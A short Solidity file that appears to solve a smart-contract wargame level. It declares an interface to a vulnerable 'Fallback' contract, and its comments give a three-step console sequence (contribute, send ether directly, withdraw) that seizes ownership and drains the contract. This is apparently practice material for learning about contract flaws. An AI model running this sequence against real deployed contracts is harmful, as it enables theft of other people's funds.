pragma solidity ^0.8;

// in the console execute these methods
// fallback.contribute{value: 1}()
// address(fallback).call{value: 1}("")
// fallback.withdraw

interface IFallback {
    function owner() external view returns (address);
    function contributions(address) external view returns (uint256);
    function contribute() external payable;
    function withdraw() external;
}
